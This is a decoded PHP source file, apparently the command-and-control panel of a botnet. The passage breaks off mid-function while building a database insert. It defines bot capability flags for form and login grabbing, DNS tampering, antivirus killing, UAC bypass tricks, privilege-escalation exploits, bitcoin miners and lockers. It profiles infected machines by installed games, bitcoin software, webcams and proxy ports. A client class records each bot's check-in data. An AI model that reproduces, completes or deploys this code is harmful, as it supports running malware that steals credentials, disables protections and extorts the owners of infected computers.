<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

if (!defined("IN_CORE_INC")) {
    exit("..");
}
define("WINDOWS_VERSION_S2003", 1);
define("WINDOWS_VERSION_S2008", 2);
define("WINDOWS_VERSION_S2008R2", 4);
define("WINDOWS_VERSION_S2012", 8192);
define("WINDOWS_VERSION_UNSUPPORTED", 8);
define("WINDOWS_VERSION_XP", 128);
define("WINDOWS_VERSION_VS", 64);
define("WINDOWS_VERSION_W7", 32);
define("WINDOWS_VERSION_W8", 16);
define("WINDOWS_VERSION_W10", 16384);
define("WINDOWS_VERSION_BIT_32", 256);
define("WINDOWS_VERSION_BIT_64", 512);
define("WINDOWS_VERSION_SP_SP1", 1024);
define("WINDOWS_VERSION_SP_SP2", 2048);
define("WINDOWS_VERSION_SP_SP3", 4096);
define("WINDOWS_VERSION_PRODUCT_STARTER", 65536);
define("WINDOWS_VERSION_PRODUCT_HOME_BASIC", 131072);
define("WINDOWS_VERSION_PRODUCT_HOME_PREMIUM", 262144);
define("WINDOWS_VERSION_PRODUCT_PROFESSIONAL", 524288);
define("WINDOWS_VERSION_PRODUCT_ULTIMATE", 1048576);
define("WINDOWS_VERSION_PRODUCT_BUSINESS", 2097152);
define("WINDOWS_VERSION_PRODUCT_ENTERPRISE", 4194304);
define("WINDOWS_VERSION_PRODUCT_DATACENTER", 8388608);
define("BOT_STATUS_FLAG_IGNORE_STATUS", 0);
define("BOT_STATUS_FLAG_PROACTIVE_ENABLED", 1);
define("BOT_STATUS_FLAG_FORMGRAB_DISABLED", 2);
define("BOT_STATUS_FLAG_DNS_MODIFY_DISABLED", 4);
define("BOT_STATUS_FLAG_AUTO_RUN_ENABLED", 8);
define("BOT_STATUS_FLAG_ANTISECURITY_ENABLED", 16);
define("BOT_STATUS_FLAG_DYNAMIC_CONFIG_DISABLED", 32);
define("BOT_STATUS_FLAG_LOGIN_GRAB_DISABLED", 64);
define("BOT_STATUS_FLAG_USERKIT_DISABLED", 128);
define("BOT_STATUS_FLAG_SYS_INJECTIONS_DISABLED", 256);
define("BOT_STATUS_FLAG_SYS_INJECTIONS_XBROWSER_DISABLED", 512);
define("BOT_STATUS_FLAG_ANTI_EXPLOIT_KIT_ENABLED", 1024);
define("BOT_STATUS_FLAG_ANTI_BOOTKIT_ENABLED", 2048);
define("BOT_STATUS_FLAG_FORCE_IE_ENABLED", 4096);
define("BOT_STATUS_FLAG_PRIVILEGE_ESCALATION_EXPLOITS_ENABLED", 8192);
define("BOT_STATUS_FLAG_PROACTIVE_BTC_MINERS_ENABLED", 16384);
define("BOT_STATUS_FLAG_PROACTIVE_LOCKERS_ENABLED", 32768);
define("BOT_STATUS_FLAG_LOWER_SYSTEM_SECURITY", 65536);
define("BOT_STATUS_FLAG_INVALID_STATUS", 4294967295.0);
define("BOT_ATTRIBUTE_BOT_SOURCE_USB", 1);
define("BOT_ATTRIBUTE_HAS_NET_FRAMEWORK", 2);
define("BOT_ATTRIBUTE_HAS_JAVA", 4);
define("BOT_ATTRIBUTE_HAS_STEAM", 8);
define("BOT_ATTRIBUTE_HAS_ROUTER", 16);
define("BOT_ATTRIBUTE_IS_ELEVATED", 32);
define("BOT_ATTRIBUTE_IS_GOOD_FOR_BITCOINS", 64);
define("BOT_ATTRIBUTE_IS_COMPUTER_SAVVY", 128);
define("BOT_ATTRIBUTE_IS_LAPTOP", 256);
define("BOT_ATTRIBUTE_UAC_ENABLED", 512);
define("BOT_ATTRIBUTE_HAS_USED_RDP", 1024);
define("BOT_ATTRIBUTE_IS_VIRTUAL_MACHINE", 2048);
define("BOT_ATTRIBUTE_HAS_SAMSUNG_DEVICE", 4096);
define("BOT_ATTRIBUTE_HAS_APPLE_DEVICE", 8192);
define("BOT_ATTRIBUTE_AVKILL_HAS_EXECUTED", 16777216);
define("BOT_ATTRIBUTE_TRICK_WORKED_USED_IFEO_TRICK", 134217728);
define("BOT_ATTRIBUTE_TRICK_WORKED_USED_SHIM_TRICK", 268435456);
define("BOT_ATTRIBUTE_UAC_REQUIRES_TRICK", 536870912);
define("BOT_ATTRIBUTE_UAC_TRICK_WORKED", 1073741824);
define("BOT_SOFTWARE_STEAM_CLIENT", 1);
define("BOT_SOFTWARE_ORIGIN_CLIENT", 2);
define("BOT_SOFTWARE_RUNESCAPE", 4);
define("BOT_SOFTWARE_MINECRAFT", 8);
define("BOT_SOFTWARE_BLIZZARD", 16);
define("BOT_SOFTWARE_LEAGUE_OF_LEGENDS", 64);
define("BOT_SOFTWARE_BITCOIN_RELATED", 128);
define("BOT_SOFTWARE_WEBCAM", 256);
define("BOT_SOFTWARE_JAVA", 512);
define("BOT_SOFTWARE_SKYPE", 1024);
define("BOT_SOFTWARE_VISUAL_STUDIO", 2048);
define("BOT_SOFTWARE_VM_SOFTWARE", 4096);
define("WEB_ATTRIBUTE_IE_VERSION_7", 1);
define("WEB_ATTRIBUTE_IE_VERSION_8", 2);
define("WEB_ATTRIBUTE_IE_VERSION_9", 4);
define("WEB_ATTRIBUTE_IE_VERSION_10", 8);
define("WEB_ATTRIBUTE_IE_VERSION_11", 16);
define("WEB_ATTRIBUTE_IE_VERSION_OTHER", 32);
define("WEB_ATTRIBUTE_HOOKS_ALREADY_EXIST", 64);
define("BOT_STATUS_NO_STATUS_SPECIFIED", 0);
define("BOT_STATUS_ONLINE", 1);
define("BOT_STATUS_OFFLINE", 2);
define("BOT_STATUS_DEAD", 4);
define("BOT_STATUS_DELETED", 8);
define("BOT_RECORD_IS_DIRTY", 1);
define("BOT_RECORD_IS_FAVORITE", 2);
define("BOT_RECORD_IS_VIRTUAL_MACHINE", 4);
define("__BOT_DISPOSITION_UNINSTALL_SELF", 68117);
define("BOT_MAX_GROUP_NAME_CHARACTERS", 12);
define("STATS_INTEGER_FIELD_OPERATOR_LESS_THAN", 0);
define("STATS_INTEGER_FIELD_OPERATOR_GREATER_THAN", 1);
define("STATS_INTEGER_FIELD_OPERATOR_GREATER_THAN_OR_EQUAL_TO", 2);
define("STATS_INTEGER_FIELD_OPERATOR_LESS_THAN_OR_EQUAL_TO", 3);
class CClient extends CSqlWrap
{
    public $Bot_RecordID = -1;
    public $Bot_OS = 0;
    public $Bot_Locale = "";
    public $Bot_LocaleName = "";
    public $Bot_Names = "";
    public $Bot_InstallPath = "";
    public $Bot_FirstCheckIn = 0;
    public $Bot_LastCheckIn = 0;
    public $Bot_LastInfoReport = 0;
    public $Bot_DefaultBrowser = "";
    public $Bot_CpuName = "";
    public $Bot_VideoCardName = "";
    public $Bot_ProductId = "";
    public $Bot_RecordAttributes = 0;
    public $Bot_Status = 0;
    public $Bot_LastTask = 0;
    public $Bot_Attributes = 0;
    public $Bot_Version = 0;
    public $Bot_Time_Current = 0;
    public $Bot_Time_Uptime = 0;
    public $Bot_Time_GMT = 0;
    public $Bots_Killed = 0;
    public $Bot_SocksPort = 0;
    public $CustomAttributes = 0;
    public $DebugAttributes = 0;
    public $CveAttributes = 0;
    public $PrimaryResolution = 0;
    public $Bot_Version_Major = 0;
    public $Bot_Version_Minor = 0;
    public $Bot_Version_Revision = 0;
    public $Bot_Version_Build = 0;
    public $TaskID_1 = 0;
    public $TaskID_StatusFlags_1 = 0;
    public $TaskID_2 = 0;
    public $TaskID_StatusFlags_2 = 0;
    public $TaskID_3 = 0;
    public $TaskID_StatusFlags_3 = 0;
    public $TaskID_4 = 0;
    public $TaskID_StatusFlags_4 = 0;
    public $TaskID_5 = 0;
    public $TaskID_StatusFlags_5 = 0;
    public $TaskID_6 = 0;
    public $TaskID_StatusFlags_6 = 0;
    public $TaskID_7 = 0;
    public $TaskID_StatusFlags_7 = 0;
    public $TaskID_8 = 0;
    public $TaskID_StatusFlags_8 = 0;
    public $Machine_GUID = "";
    public $GroupName = "";
    public $HostProcessName = "";
    public $ConfigVer_DynamicConfig = 0;
    public $ConfigVer_DNS_Blocklist = 0;
    public $ConfigVer_URL_Tracklist = 0;
    public $ConfigVer_FileSearch = 0;
    public $ConfigVer_Plugins = 0;
    public $ConfigVer_Web = 0;
    public $Avs_Installed = 0;
    public $Software_Installed = 0;
    public $SecurityTools_Installed = 0;
    public $Avs_Killed = 0;
    public $WebAttributes = 0;
    public $Exceptions_AccessViolation = 0;
    public $Exceptions_PrivInstruction = 0;
    public $Exceptions_IllegalInstruction = 0;
    public $Exceptions_StackOverflow = 0;
    public $Exceptions_InPageError = 0;
    public $ExInfLow_PersistNumOfFileRestores = 0;
    public $ExInfLow_NumOfCrashRestarts = 0;
    public $InfoBlob_ProcessList = "";
    public $InfoBlob_InstalledSoftwareList = "";
    public $InfoBlob_AutostartList = "";
    public $InfoBlob_Generic = "";
    public $InfoBlob_Debug = "";
    public $Bot_RecordComments = "";
    public $Bot_LastTasksHash = "";
    public function BinaryGuidToStringGuid($bin_guid = "")
    {
        return @bin2hex($bin_guid);
    }
    public function TranslateFromBotRequest($bot_request_array)
    {
        if (!isset($bot_request_array)) {
            return NULL;
        }
        $this->Machine_GUID = $bot_request_array["machine_id"];
        $this->Bot_OS = (int) $bot_request_array["bot_os"];
        $this->Bot_Attributes = (int) $bot_request_array["bot_attributes"];
        $this->Bot_Version = (int) $bot_request_array["bot_version"];
        $this->Bot_Time_Current = (int) $bot_request_array["bot_time_current"];
        $this->Bot_Time_Uptime = (int) $bot_request_array["bot_time_uptime"];
        $this->Bot_Time_GMT = (int) $bot_request_array["bot_time_gmt"];
        $this->Bots_Killed = (int) $bot_request_array["bots_killed"];
        $this->Bot_SocksPort = (int) $bot_request_array["socks_port"];
        $this->Avs_Installed = (int) $bot_request_array["avs_installed"];
        $this->Software_Installed = (int) $bot_request_array["software_installed"];
        if (isset($bot_request_array["security_tools_installed"])) {
            $this->SecurityTools_Installed = (int) $bot_request_array["security_tools_installed"];
        }
        if (isset($bot_request_array["avs_killed"])) {
            $this->Avs_Killed = (int) $bot_request_array["avs_killed"];
        }
        if (isset($bot_request_array["web_attributes"])) {
            $this->WebAttributes = (int) $bot_request_array["web_attributes"];
        }
        if (isset($bot_request_array["bot_custom_attributes"])) {
            $this->CustomAttributes = (int) $bot_request_array["bot_custom_attributes"];
        }
        if (isset($bot_request_array["debug_attributes"])) {
            $this->DebugAttributes = (int) $bot_request_array["debug_attributes"];
        }
        if (isset($bot_request_array["taskid_error_1"])) {
            $bot_request_array["taskid_info_1"] = $bot_request_array["taskid_error_1"];
            if ((int) $bot_request_array["taskid_info_1"] != 0) {
                $bot_request_array["taskid_flags_1"] = TASK_COMPLETION_STATUS_ERROR;
            }
            $bot_request_array["taskid_info_2"] = $bot_request_array["taskid_error_2"];
            if ((int) $bot_request_array["taskid_info_2"] != 0) {
                $bot_request_array["taskid_flags_2"] = TASK_COMPLETION_STATUS_ERROR;
            }
            $bot_request_array["taskid_info_3"] = $bot_request_array["taskid_error_3"];
            if ((int) $bot_request_array["taskid_info_3"] != 0) {
                $bot_request_array["taskid_flags_3"] = TASK_COMPLETION_STATUS_ERROR;
            }
            $bot_request_array["taskid_info_4"] = $bot_request_array["taskid_error_4"];
            if ((int) $bot_request_array["taskid_info_4"] != 0) {
                $bot_request_array["taskid_flags_4"] = TASK_COMPLETION_STATUS_ERROR;
            }
            $bot_request_array["taskid_info_5"] = $bot_request_array["taskid_error_5"];
            if ((int) $bot_request_array["taskid_info_5"] != 0) {
                $bot_request_array["taskid_flags_5"] = TASK_COMPLETION_STATUS_ERROR;
            }
            $bot_request_array["taskid_info_6"] = $bot_request_array["taskid_error_6"];
            if ((int) $bot_request_array["taskid_info_6"] != 0) {
                $bot_request_array["taskid_flags_6"] = TASK_COMPLETION_STATUS_ERROR;
            }
            $bot_request_array["taskid_info_7"] = $bot_request_array["taskid_error_7"];
            if ((int) $bot_request_array["taskid_info_7"] != 0) {
                $bot_request_array["taskid_flags_7"] = TASK_COMPLETION_STATUS_ERROR;
            }
            $bot_request_array["taskid_info_8"] = $bot_request_array["taskid_error_8"];
            if ((int) $bot_request_array["taskid_info_8"] != 0) {
                $bot_request_array["taskid_flags_8"] = TASK_COMPLETION_STATUS_ERROR;
            }
        }
        if (isset($bot_request_array["taskid_info_1"])) {
            $this->TaskID_1 = $bot_request_array["taskid_info_1"];
            $this->TaskID_StatusFlags_1 = $bot_request_array["taskid_flags_1"];
            if ($this->TaskID_StatusFlags_1 & TASK_COMPLETION_FLAG_CHECK_MESSAGE) {
                $this->TaskID_StatusFlags_1 &= ~TASK_COMPLETION_FLAG_CHECK_MESSAGE;
            }
        } else {
            $this->TaskID_1 = 0;
            $this->TaskID_StatusFlags_1 = 0;
        }
        if (isset($bot_request_array["taskid_info_2"])) {
            $this->TaskID_2 = $bot_request_array["taskid_info_2"];
            $this->TaskID_StatusFlags_2 = $bot_request_array["taskid_flags_2"];
            if ($this->TaskID_StatusFlags_2 & TASK_COMPLETION_FLAG_CHECK_MESSAGE) {
                $this->TaskID_StatusFlags_2 &= ~TASK_COMPLETION_FLAG_CHECK_MESSAGE;
            }
        } else {
            $this->TaskID_2 = 0;
            $this->TaskID_StatusFlags_2 = 0;
        }
        if (isset($bot_request_array["taskid_info_3"])) {
            $this->TaskID_3 = $bot_request_array["taskid_info_3"];
            $this->TaskID_StatusFlags_3 = $bot_request_array["taskid_flags_3"];
            if ($this->TaskID_StatusFlags_3 & TASK_COMPLETION_FLAG_CHECK_MESSAGE) {
                $this->TaskID_StatusFlags_3 &= ~TASK_COMPLETION_FLAG_CHECK_MESSAGE;
            }
        } else {
            $this->TaskID_3 = 0;
            $this->TaskID_StatusFlags_3 = 0;
        }
        if (isset($bot_request_array["taskid_info_4"])) {
            $this->TaskID_4 = $bot_request_array["taskid_info_4"];
            $this->TaskID_StatusFlags_4 = $bot_request_array["taskid_flags_4"];
            if ($this->TaskID_StatusFlags_4 & TASK_COMPLETION_FLAG_CHECK_MESSAGE) {
                $this->TaskID_StatusFlags_4 &= ~TASK_COMPLETION_FLAG_CHECK_MESSAGE;
            }
        } else {
            $this->TaskID_4 = 0;
            $this->TaskID_StatusFlags_4 = 0;
        }
        if (isset($bot_request_array["taskid_info_5"])) {
            $this->TaskID_5 = $bot_request_array["taskid_info_5"];
            $this->TaskID_StatusFlags_5 = $bot_request_array["taskid_flags_5"];
            if ($this->TaskID_StatusFlags_5 & TASK_COMPLETION_FLAG_CHECK_MESSAGE) {
                $this->TaskID_StatusFlags_5 &= ~TASK_COMPLETION_FLAG_CHECK_MESSAGE;
            }
        } else {
            $this->TaskID_5 = 0;
            $this->TaskID_StatusFlags_5 = 0;
        }
        if (isset($bot_request_array["taskid_info_6"])) {
            $this->TaskID_6 = $bot_request_array["taskid_info_6"];
            $this->TaskID_StatusFlags_6 = $bot_request_array["taskid_flags_6"];
            if ($this->TaskID_StatusFlags_6 & TASK_COMPLETION_FLAG_CHECK_MESSAGE) {
                $this->TaskID_StatusFlags_6 &= ~TASK_COMPLETION_FLAG_CHECK_MESSAGE;
            }
        } else {
            $this->TaskID_6 = 0;
            $this->TaskID_StatusFlags_6 = 0;
        }
        if (isset($bot_request_array["taskid_info_7"])) {
            $this->TaskID_7 = $bot_request_array["taskid_info_7"];
            $this->TaskID_StatusFlags_7 = $bot_request_array["taskid_flags_7"];
            if ($this->TaskID_StatusFlags_7 & TASK_COMPLETION_FLAG_CHECK_MESSAGE) {
                $this->TaskID_StatusFlags_7 &= ~TASK_COMPLETION_FLAG_CHECK_MESSAGE;
            }
        } else {
            $this->TaskID_7 = 0;
            $this->TaskID_StatusFlags_7 = 0;
        }
        if (isset($bot_request_array["taskid_info_8"])) {
            $this->TaskID_8 = $bot_request_array["taskid_info_8"];
            $this->TaskID_StatusFlags_8 = $bot_request_array["taskid_flags_8"];
            if ($this->TaskID_StatusFlags_8 & TASK_COMPLETION_FLAG_CHECK_MESSAGE) {
                $this->TaskID_StatusFlags_8 &= ~TASK_COMPLETION_FLAG_CHECK_MESSAGE;
            }
        } else {
            $this->TaskID_8 = 0;
            $this->TaskID_StatusFlags_8 = 0;
        }
        if (isset($bot_request_array["group_name"])) {
            $this->GroupName = trim($bot_request_array["group_name"]);
            if (ctype_alnum($this->GroupName) == false) {
                $this->GroupName = "default";
            }
        } else {
            $this->GroupName = "default";
        }
        if (isset($bot_request_array["bot_process_name"])) {
            $this->HostProcessName = trim($bot_request_array["bot_process_name"]);
        }
        if (isset($bot_request_array["exception_access_violation"])) {
            $this->Exceptions_AccessViolation = (int) $bot_request_array["exception_access_violation"];
        }
        if (isset($bot_request_array["exception_priv_instruction"])) {
            $this->Exceptions_PrivInstruction = (int) $bot_request_array["exception_priv_instruction"];
        }
        if (isset($bot_request_array["exception_illegal_instruction"])) {
            $this->Exceptions_IllegalInstruction = (int) $bot_request_array["exception_illegal_instruction"];
        }
        if (isset($bot_request_array["exception_stack_overflow"])) {
            $this->Exceptions_StackOverflow = (int) $bot_request_array["exception_stack_overflow"];
        }
        if (isset($bot_request_array["exception_in_page_error"])) {
            $this->Exceptions_InPageError = (int) $bot_request_array["exception_in_page_error"];
        }
        if (isset($bot_request_array["persist_num_file_restores"])) {
            $this->ExInfLow_PersistNumOfFileRestores = (int) $bot_request_array["persist_num_file_restores"];
        }
        if (isset($bot_request_array["num_crash_restarts"])) {
            $this->ExInfLow_NumOfCrashRestarts = (int) $bot_request_array["num_crash_restarts"];
        }
        $this->ConfigVer_DynamicConfig = (int) $bot_request_array["cfg_versions_config"];
        $this->ConfigVer_DNS_Blocklist = (int) $bot_request_array["cfg_versions_dns_blocklist"];
        $this->ConfigVer_URL_Tracklist = (int) $bot_request_array["cfg_versions_url_tracklist"];
        if (isset($bot_request_array["cfg_versions_filesearch"])) {
            $this->ConfigVer_FileSearch = (int) $bot_request_array["cfg_versions_filesearch"];
        }
        if (isset($bot_request_array["cfg_versions_plugins"])) {
            $this->ConfigVer_Plugins = (int) $bot_request_array["cfg_versions_plugins"];
        }
        if (isset($bot_request_array["cfg_versions_web"])) {
            $this->ConfigVer_Web = (int) $bot_request_array["cfg_versions_web"];
        }
        $_obfuscated_0D182E112C24372112161E371111190C3D012E1A152F22_ = (int) strlen($this->Machine_GUID);
        if ($_obfuscated_0D182E112C24372112161E371111190C3D012E1A152F22_ < 16 && 0 < $_obfuscated_0D182E112C24372112161E371111190C3D012E1A152F22_) {
            $_obfuscated_0D384006072605172816285B1B3E1B0322071D32292711_ = 16 - $_obfuscated_0D182E112C24372112161E371111190C3D012E1A152F22_;
            for ($i = 0; $i < $_obfuscated_0D384006072605172816285B1B3E1B0322071D32292711_; $i++) {
                $this->Machine_GUID .= "";
            }
        }
        if (16 < $_obfuscated_0D182E112C24372112161E371111190C3D012E1A152F22_) {
            $this->Machine_GUID = substr($this->Machine_GUID, 0, 16);
        }
        _obfuscated_0D5C1C162637013135161F331C1F090D280429392F1701_($this->Bot_Version, $this->Bot_Version_Major, $this->Bot_Version_Minor, $this->Bot_Version_Revision, $this->Bot_Version_Build);
        if ((int) $this->Bot_Version_Major == 1 && (int) $this->Bot_Version_Minor <= 8 && (int) $this->Bot_Version_Build < 3) {
            $this->SecurityTools_Installed = 0;
            $this->Avs_Killed = 0;
        }
        return $this;
    }
    public function TranslateFromSqlRecord($bot_record)
    {
        if (!isset($bot_record) || !isset($bot_record["id"])) {
            return NULL;
        }
        $this->Bot_RecordID = (int) $bot_record["id"];
        $this->Bot_OS = (int) $bot_record["OS"];
        $this->Bot_Attributes = (int) $bot_record["ClientAttributes"];
        $this->Bot_Version = (int) $bot_record["Version"];
        $this->Bot_Time_Current = (int) $bot_record["BotTime"];
        $this->Bots_Killed = (int) $bot_record["BotsKilled"];
        $this->Machine_GUID = $bot_record["GUID"];
        $this->Bot_Names = $bot_record["CompNameUsername"];
        $this->Bot_InstallPath = $bot_record["InstallPath"];
        $this->Bot_FirstCheckIn = (int) $bot_record["FirstCheckIn"];
        $this->Bot_LastInfoReport = (int) $bot_record["LastInfoReport"];
        $this->ConfigVer_DNS_Blocklist = (int) $bot_record["DnsModify_Revision"];
        $this->ConfigVer_URL_Tracklist = (int) $bot_record["UrlTrack_Revision"];
        $this->ConfigVer_DynamicConfig = (int) $bot_record["Config_Revision"];
        $this->Bot_DefaultBrowser = $bot_record["DefaultBrowser"];
        $this->Bot_CpuName = $bot_record["CpuName"];
        $this->Bot_VideoCardName = $bot_record["VideoCardName"];
        $this->Bot_ProductId = $bot_record["ProductId"];
        $this->Bot_SocksPort = (int) $bot_record["SocksPort"];
        $this->Bots_Killed = (int) $bot_record["BotsKilled"];
        $this->Bot_RecordAttributes = (int) $bot_record["RecordAttributes"];
        $this->Bot_Attributes = (int) $bot_record["ClientAttributes"];
        $this->Bot_Status = (int) $bot_record["ClientStatus"];
        $this->Bot_LastTask = (int) $bot_record["LastTask"];
        if (isset($bot_record["NumTimesFileRestored"])) {
            $this->ExInfLow_PersistNumOfFileRestores = (int) $bot_record["NumTimesFileRestored"];
        }
        if (isset($bot_record["CrashRestartCount"])) {
            $this->ExInfLow_NumOfCrashRestarts = (int) $bot_record["CrashRestartCount"];
        }
        $this->DebugAttributes = (int) $bot_record["DebugAttributes"];
        $this->GroupName = $bot_record["GroupName"];
        $this->HostProcessName = $bot_record["HostProcessName"];
        $this->ConfigVer_DynamicConfig = (int) $bot_record["Config_Revision"];
        $this->ConfigVer_DNS_Blocklist = (int) $bot_record["DnsModify_Revision"];
        $this->ConfigVer_URL_Tracklist = (int) $bot_record["UrlTrack_Revision"];
        if (isset($bot_record["FileSearch_Revision"])) {
            $this->ConfigVer_FileSearch = (int) $bot_record["FileSearch_Revision"];
        }
        if (isset($bot_record["Plugins_Revision"])) {
            $this->ConfigVer_Plugins = (int) $bot_record["Plugins_Revision"];
        }
        if (isset($bot_record["Web_Revision"])) {
            $this->ConfigVer_Web = (int) $bot_record["Web_Revision"];
        }
        if (isset($bot_record["monitor_resolution"])) {
            $_obfuscated_0D1B350D0F1F391F0338113010070A1D052F0D03181E11_->PrimaryResolution = $bot_record["monitor_resolution"];
        }
        if (isset($bot_record["exploit_info"])) {
            $_obfuscated_0D1B350D0F1F391F0338113010070A1D052F0D03181E11_->CveAttributes = $bot_record["exploit_info"];
        }
        $this->Avs_Installed = (int) $bot_record["AvsInstalled"];
        $this->Software_Installed = (int) $bot_record["SoftwareInstalled"];
        if (isset($bot_record["SecurityToolsInstalled"])) {
            $this->SecurityTools_Installed = (int) $bot_record["SecurityToolsInstalled"];
        }
        if (isset($bot_record["AvsKilled"])) {
            $this->Avs_Killed = (int) $bot_record["AvsKilled"];
        }
        $this->WebAttributes = (int) $bot_record["WebAttributes"];
        if (isset($bot_record["excp_access_violation"])) {
            $this->Exceptions_AccessViolation = $bot_record["excp_access_violation"];
        }
        if (isset($bot_record["excp_priv_instruction"])) {
            $this->Exceptions_PrivInstruction = $bot_record["excp_priv_instruction"];
        }
        if (isset($bot_record["excp_illegal_instruction"])) {
            $this->Exceptions_IllegalInstruction = $bot_record["excp_illegal_instruction"];
        }
        if (isset($bot_record["excp_stack_overflow"])) {
            $this->Exceptions_StackOverflow = $bot_record["excp_stack_overflow"];
        }
        if (isset($bot_record["excp_in_page_error"])) {
            $this->Exceptions_InPageError = $bot_record["excp_in_page_error"];
        }
        $this->Bot_RecordComments = $bot_record["Comments"];
        if (isset($bot_record["last_tasks_hash"])) {
            $this->Bot_LastTasksHash = $bot_record["last_tasks_hash"];
        }
        _obfuscated_0D5C1C162637013135161F331C1F090D280429392F1701_($this->Bot_Version, $this->Bot_Version_Major, $this->Bot_Version_Minor, $this->Bot_Version_Revision, $this->Bot_Version_Build);
        return $this;
    }
    public function AddClient($botClientEx = NULL)
    {
        if ($botClientEx == NULL) {
            return -1;
        }
        $_obfuscated_0D051637252E0E2F242E1F08092B040D2A400235053B01_ = (int) strlen($botClientEx->Machine_GUID);
        if ($_obfuscated_0D051637252E0E2F242E1F08092B040D2A400235053B01_ < 14 || 16 < $_obfuscated_0D051637252E0E2F242E1F08092B040D2A400235053B01_) {
            return -1;
        }
        if (strlen($botClientEx->Bot_InstallPath) == 0) {
            return -1;
        }
        $_obfuscated_0D1C1D01351B29192F0D0C121230401C2F162F1F023C11_ = sprintf("%u", $botClientEx->Bot_Version);
        $_obfuscated_0D331606303D213632133E110E3F230F263E0932301F22_ = sprintf("%u", $botClientEx->Bot_OS);
        $_obfuscated_0D06192737381C2F14170A312D383D3B08270502292311_ = bin2hex($botClientEx->Machine_GUID);
        $_obfuscated_0D1F131E2D041E2A25361925351F3C340839190A250D01_ = bin2hex($botClientEx->Bot_Names);
        $_obfuscated_0D0C241E3714230321273F29233736091D143C053D2D32_ = bin2hex($botClientEx->Bot_InstallPath);
        $_obfuscated_0D1B0B3D1B133813341C1D013F233536260D2D32040701_ = bin2hex($botClientEx->Bot_DefaultBrowser);
        $_obfuscated_0D30343413233213213F385C041B092D11023E3E403E32_ = bin2hex($botClientEx->Bot_CpuName);
        $_obfuscated_0D1E3232270E25241C35133B1F041F150D190A5C343101_ = bin2hex($botClientEx->Bot_VideoCardName);
        $_obfuscated_0D21321F24120A2114263523380D120410043202152A01_ = bin2hex($botClientEx->Bot_ProductId);
        $_obfuscated_0D043B2C241C0C031A5C2D332834262F240D2C17113F32_ = sprintf("%u", ip2long($_SERVER["REMOTE_ADDR"]));
        $_obfuscated_0D5B372F1E0C1E0D0B241E3C14031D362E0603322A1E32_ = sprintf("%u", $botClientEx->Bot_Time_Current);
        $_obfuscated_0D04063F0317122C2A243B2C0F1F0F033C2C05101C0632_ = bin2hex($botClientEx->Bot_Locale);
        $_obfuscated_0D1B2E22185B1419223E075C26080D130A5C2732292511_ = bin2hex($botClientEx->Bot_LocaleName);
        $_obfuscated_0D130F3D4005110415231436340F2B3D5B033D06372B22_ = 0;
        $_obfuscated_0D27223F23353523220F5C312A293E5C0F091E3F371601_ = BOT_STATUS_ONLINE;
        $_obfuscated_0D070B2B042A285B3936140B28400D1F2838221A0E2F32_ = sprintf("%u", $botClientEx->ConfigVer_DNS_Blocklist);
        $_obfuscated_0D0C32402C40033C09291E180E3C1F16161F03063C0411_ = sprintf("%u", $botClientEx->ConfigVer_URL_Tracklist);
        $_obfuscated_0D0C1F18101E06312E170F061E243F2E323B033F335C01_ = sprintf("%u", $botClientEx->ConfigVer_DynamicConfig);
        $_obfuscated_0D0E2F0E09133D292A3E3D1D37101F14141A1004350832_ = sprintf("%u", $botClientEx->ConfigVer_FileSearch);
        $_obfuscated_0D010E0D18210934042F02130508361B035B3E1B303901_ = sprintf("%u", $botClientEx->ConfigVer_Plugins);
        $_obfuscated_0D342640382D5C3D213F19370832031A103D2F21090422_ = sprintf("%u", $botClientEx->ConfigVer_Web);
        $_obfuscated_0D1F2522400E0607212314050121121F2814080E051F32_ = sprintf("%u", $botClientEx->Bot_Attributes);
        $_obfuscated_0D355B15342721301A1C3C1229291106212B022A011222_ = sprintf("%u", $botClientEx->CustomAttributes);
        $_obfuscated_0D1D01022A2F031F221C031F0D1F15115C313102232A01_ = sprintf("%u", $botClientEx->Software_Installed);
        $_obfuscated_0D0B26162C2C5C5C22320E32254025251B3F3906392A11_ = sprintf("%u", $botClientEx->Avs_Installed);
        $_obfuscated_0D5B0F2B1E1E1B2D5C190D27331C373E140E3531013511_ = sprintf("%u", $botClientEx->Avs_Killed);
        $_obfuscated_0D16372422250B0517253B04252835312F35270A0E2832_ = sprintf("%u", $botClientEx->SecurityTools_Installed);
        $_obfuscated_0D0206380C071F2F0238250E302B3D3B39162E06230311_ = sprintf("%u", $botClientEx->WebAttributes);
        $_obfuscated_0D245B162F24031C2A1F340305172337382E110B293311_ = sprintf("%u", $botClientEx->DebugAttributes);
        $_obfuscated_0D250F4008071819333E1C182A04352D2C052F081A1632_ = sprintf("%u", $botClientEx->CveAttributes);
        $_obfuscated_0D0A1E123F402F1C3212081924082B170A323609290D32_ = sprintf("%u", $botClientEx->PrimaryResolution);
        $_obfuscated_0D3506032A5B1B231C240A022C350407185B2D06343822_ = bin2hex(_obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($botClientEx->GroupName));
        $_obfuscated_0D3C1717322703291D05251B3421170A380A09250B3322_ = bin2hex(_obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($botClientEx->HostProcessName));
        $_obfuscated_0D1911380D220B2A3C1A16300E29060D2133332F343E01_ = sprintf("%u", $botClientEx->ExInfLow_NumOfCrashRestarts);
        $_obfuscated_0D0913042D08361E0A1E040D10082C4013183E15193522_ = $botClientEx->Exceptions_AccessViolation;
        $_obfuscated_0D28343637013B3018121336310A3C1B11371B101E0622_ = $botClientEx->Exceptions_PrivInstruction;
        $_obfuscated_0D2B103B34095B26270E29382D073E1232283410152222_ = $botClientEx->Exceptions_IllegalInstruction;
        $_obfuscated_0D36101D042C172A0A2A252D101310395C30135B5C2E32_ = $botClientEx->Exceptions_StackOverflow;
        $_obfuscated_0D175B211C10292728223C2237091C36331D4016400222_ = $botClientEx->Exceptions_InPageError;
        if ($_obfuscated_0D1F2522400E0607212314050121121F2814080E051F32_ & BOT_ATTRIBUTE_IS_VIRTUAL_MACHINE) {
            $_obfuscated_0D130F3D4005110415231436340F2B3D5B033D06372B22_ |= BOT_RECORD_IS_VIRTUAL_MACHINE;
            $_obfuscated_0D1F2522400E0607212314050121121F2814080E051F32_ &= ~BOT_ATTRIBUTE_IS_VIRTUAL_MACHINE;
        }
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ = "INSERT INTO " . $this->pdbname . ".clients VALUES(";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "NULL, ";
